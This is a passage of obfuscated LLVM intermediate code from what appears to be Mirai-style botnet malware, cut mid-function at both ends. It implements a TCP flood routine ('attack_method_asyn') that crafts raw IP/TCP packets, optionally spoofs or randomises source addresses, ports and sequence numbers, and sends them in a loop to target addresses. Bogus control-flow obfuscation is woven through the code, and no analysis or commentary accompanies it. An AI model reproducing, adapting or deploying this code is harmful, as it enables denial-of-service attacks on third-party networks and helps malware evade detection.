  %478 = load i16, i16* %477, align 2
  %479 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %480 = load i32, i32* %9, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %479, i64 %481
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i32 0, i32 0
  %484 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %483, i32 0, i32 1
  store i16 %478, i16* %484, align 2
  %485 = load i32, i32* %10, align 4
  %486 = load i8*, i8** %30, align 8
  %487 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %488 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %491, i32 0, i32 0
  %493 = bitcast %struct.sockaddr_in* %492 to %struct.sockaddr*
  store %struct.sockaddr* %493, %struct.sockaddr** %487, align 8
  %494 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %495 = load %struct.sockaddr*, %struct.sockaddr** %494, align 8
  %496 = call i64 @sendto(i32 %485, i8* %486, i64 60, i32 16384, %struct.sockaddr* %495, i32 16)
  br label %497

; <label>:497:                                    ; preds = %459
  %498 = load i32, i32* @x.49
  %499 = load i32, i32* @y.50
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %497
  %506 = load i32, i32* %9, align 4
  %507 = add nsw i32 %506, 1
  store i32 %507, i32* %9, align 4
  %508 = load i32, i32* @x.49
  %509 = load i32, i32* @y.50
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart222, label %originalBB17alteredBB

originalBBpart222:                                ; preds = %originalBB17
  br label %290

; <label>:516:                                    ; preds = %290
  br label %289

; <label>:517:                                    ; preds = %104, %98
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %295
  %518 = load i8**, i8*** %11, align 8
  %519 = load i32, i32* %9, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds i8*, i8** %518, i64 %520
  %522 = load i8*, i8** %521, align 8
  store i8* %522, i8** %30, align 8
  %523 = load i8*, i8** %30, align 8
  %524 = bitcast i8* %523 to %struct.iphdr*
  store %struct.iphdr* %524, %struct.iphdr** %31, align 8
  %525 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %526 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %525, i64 1
  %527 = bitcast %struct.iphdr* %526 to %struct.tcphdr*
  store %struct.tcphdr* %527, %struct.tcphdr** %32, align 8
  %528 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %529 = load i32, i32* %9, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %528, i64 %530
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %531, i32 0, i32 2
  %533 = load i8, i8* %532, align 4
  %534 = zext i8 %533 to i32
  %535 = icmp slt i32 %534, 32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %351
  %536 = load i32, i32* %26, align 4
  %537 = icmp eq i32 %536, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %398
  %538 = call i32 @rand_next()
  %_ = sub i32 0, %538
  %gen = add i32 %_, 65535
  %_7 = shl i32 %538, 65535
  %_8 = sub i32 %538, 65535
  %gen9 = mul i32 %_8, 65535
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %542 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %541, i32 0, i32 1
  store i16 %540, i16* %542, align 2
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %423
  %543 = call i32 @rand_next()
  %544 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 2
  store i32 %543, i32* %545, align 4
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %497
  %546 = load i32, i32* %9, align 4
  %_18 = sub i32 0, %546
  %gen19 = add i32 %_18, 1
  %_20 = shl i32 %546, 1
  %547 = add nsw i32 %546, 1
  store i32 %547, i32* %9, align 4
  br label %originalBB17
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_asyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %533

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %533

; <label>:107:                                    ; preds = %99
  %108 = load i32, i32* @x.51
  %109 = load i32, i32* @y.52
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %107
  store i32 0, i32* %9, align 4
  %116 = load i32, i32* @x.51
  %117 = load i32, i32* @y.52
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %124

; <label>:124:                                    ; preds = %317, %originalBBpart2
  %125 = load i32, i32* %9, align 4
  %126 = load i8, i8* %5, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp slt i32 %125, %127
  br i1 %128, label %129, label %320

; <label>:129:                                    ; preds = %124
  %130 = load i32, i32* @x.51
  %131 = load i32, i32* @y.52
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %129
  %138 = call noalias i8* @calloc(i64 128, i64 1) #6
  %139 = load i8**, i8*** %11, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  store i8* %138, i8** %142, align 8
  %143 = load i8**, i8*** %11, align 8
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  store %struct.iphdr* %148, %struct.iphdr** %27, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i64 1
  %151 = bitcast %struct.iphdr* %150 to %struct.tcphdr*
  store %struct.tcphdr* %151, %struct.tcphdr** %28, align 8
  %152 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i64 1
  %154 = bitcast %struct.tcphdr* %153 to i8*
  store i8* %154, i8** %29, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = bitcast %struct.iphdr* %155 to i8*
  %157 = load i8, i8* %156, align 4
  %158 = and i8 %157, 15
  %159 = or i8 %158, 64
  store i8 %159, i8* %156, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = and i8 %162, -16
  %164 = or i8 %163, 5
  store i8 %164, i8* %161, align 4
  %165 = load i8, i8* %12, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = call zeroext i16 @htons(i16 zeroext 60) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %13, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %15, align 1
  %179 = icmp ne i8 %178, 0
  %180 = load i32, i32* @x.51
  %181 = load i32, i32* @y.52
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart236, label %originalBB1alteredBB

originalBBpart236:                                ; preds = %originalBB1
  br i1 %179, label %188, label %192

; <label>:188:                                    ; preds = %originalBBpart236
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %originalBBpart236
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -241
  %224 = or i16 %223, 160
  store i16 %224, i16* %221, align 4
  %225 = load i8, i8* %20, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 13
  %232 = and i16 %229, -8193
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %21, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 12
  %241 = and i16 %238, -4097
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %22, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 11
  %250 = and i16 %247, -2049
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %23, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 10
  %259 = and i16 %256, -1025
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = load i8, i8* %24, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %262, 1
  %267 = shl i16 %266, 9
  %268 = and i16 %265, -513
  %269 = or i16 %268, %267
  store i16 %269, i16* %264, align 4
  %270 = load i8, i8* %25, align 1
  %271 = sext i8 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %271, 1
  %276 = shl i16 %275, 8
  %277 = and i16 %274, -257
  %278 = or i16 %277, %276
  store i16 %278, i16* %273, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 2, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 4, i8* %281, align 1
  %283 = call i32 @rand_next()
  %284 = and i32 %283, 15
  %285 = add i32 1400, %284
  %286 = trunc i32 %285 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load i8*, i8** %29, align 8
  %289 = bitcast i8* %288 to i16*
  store i16 %287, i16* %289, align 2
  %290 = load i8*, i8** %29, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  store i8* %291, i8** %29, align 8
  %292 = load i8*, i8** %29, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %29, align 8
  store i8 4, i8* %292, align 1
  %294 = load i8*, i8** %29, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %29, align 8
  store i8 2, i8* %294, align 1
  %296 = load i8*, i8** %29, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %29, align 8
  store i8 8, i8* %296, align 1
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %29, align 8
  store i8 10, i8* %298, align 1
  %300 = call i32 @rand_next()
  %301 = load i8*, i8** %29, align 8
  %302 = bitcast i8* %301 to i32*
  store i32 %300, i32* %302, align 4
  %303 = load i8*, i8** %29, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 4
  store i8* %304, i8** %29, align 8
  %305 = load i8*, i8** %29, align 8
  %306 = bitcast i8* %305 to i32*
  store i32 0, i32* %306, align 4
  %307 = load i8*, i8** %29, align 8
  %308 = getelementptr inbounds i8, i8* %307, i64 4
  store i8* %308, i8** %29, align 8
  %309 = load i8*, i8** %29, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %29, align 8
  store i8 1, i8* %309, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 3, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 3, i8* %313, align 1
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %29, align 8
  store i8 6, i8* %315, align 1
  br label %317

; <label>:317:                                    ; preds = %192
  %318 = load i32, i32* %9, align 4
  %319 = add nsw i32 %318, 1
  store i32 %319, i32* %9, align 4
  br label %124

; <label>:320:                                    ; preds = %124
  br label %321

; <label>:321:                                    ; preds = %532, %320
  %322 = load i32, i32* @x.51
  %323 = load i32, i32* @y.52
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %321
  store i32 0, i32* %9, align 4
  %330 = load i32, i32* @x.51
  %331 = load i32, i32* @y.52
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %338

; <label>:338:                                    ; preds = %529, %originalBBpart240
  %339 = load i32, i32* %9, align 4
  %340 = load i8, i8* %5, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp slt i32 %339, %341
  br i1 %342, label %343, label %532

; <label>:343:                                    ; preds = %338
  %344 = load i8**, i8*** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds i8*, i8** %344, i64 %346
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %30, align 8
  %349 = load i8*, i8** %30, align 8
  %350 = bitcast i8* %349 to %struct.iphdr*
  store %struct.iphdr* %350, %struct.iphdr** %31, align 8
  %351 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i64 1
  %353 = bitcast %struct.iphdr* %352 to %struct.tcphdr*
  store %struct.tcphdr* %353, %struct.tcphdr** %32, align 8
  %354 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %355 = load i32, i32* %9, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i64 %356
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i32 0, i32 2
  %359 = load i8, i8* %358, align 4
  %360 = zext i8 %359 to i32
  %361 = icmp slt i32 %360, 32
  br i1 %361, label %362, label %383

; <label>:362:                                    ; preds = %343
  %363 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %364 = load i32, i32* %9, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i64 %365
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i32 0, i32 1
  %368 = load i32, i32* %367, align 4
  %369 = call i32 @ntohl(i32 %368) #7
  %370 = call i32 @rand_next()
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 2
  %376 = load i8, i8* %375, align 4
  %377 = zext i8 %376 to i32
  %378 = lshr i32 %370, %377
  %379 = add i32 %369, %378
  %380 = call i32 @htonl(i32 %379) #7
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  store i32 %380, i32* %382, align 4
  br label %383

; <label>:383:                                    ; preds = %362, %343
  %384 = load i32, i32* %26, align 4
  %385 = icmp eq i32 %384, -1
  br i1 %385, label %386, label %390

; <label>:386:                                    ; preds = %383
  %387 = call i32 @rand_next()
  %388 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 8
  store i32 %387, i32* %389, align 4
  br label %390

; <label>:390:                                    ; preds = %386, %383
  %391 = load i16, i16* %13, align 2
  %392 = zext i16 %391 to i32
  %393 = icmp eq i32 %392, 65535
  br i1 %393, label %394, label %400

; <label>:394:                                    ; preds = %390
  %395 = call i32 @rand_next()
  %396 = and i32 %395, 65535
  %397 = trunc i32 %396 to i16
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 3
  store i16 %397, i16* %399, align 4
  br label %400

; <label>:400:                                    ; preds = %394, %390
  %401 = load i32, i32* @x.51
  %402 = load i32, i32* @y.52
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %400
  %409 = load i16, i16* %16, align 2
  %410 = zext i16 %409 to i32
  %411 = icmp eq i32 %410, 65535
  %412 = load i32, i32* @x.51
  %413 = load i32, i32* @y.52
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %411, label %420, label %426

; <label>:420:                                    ; preds = %originalBBpart244
  %421 = call i32 @rand_next()
  %422 = and i32 %421, 65535
  %423 = trunc i32 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  store i16 %423, i16* %425, align 4
  br label %426

; <label>:426:                                    ; preds = %420, %originalBBpart244
  %427 = load i16, i16* %17, align 2
  %428 = zext i16 %427 to i32
  %429 = icmp eq i32 %428, 65535
  br i1 %429, label %430, label %436

; <label>:430:                                    ; preds = %426
  %431 = call i32 @rand_next()
  %432 = and i32 %431, 65535
  %433 = trunc i32 %432 to i16
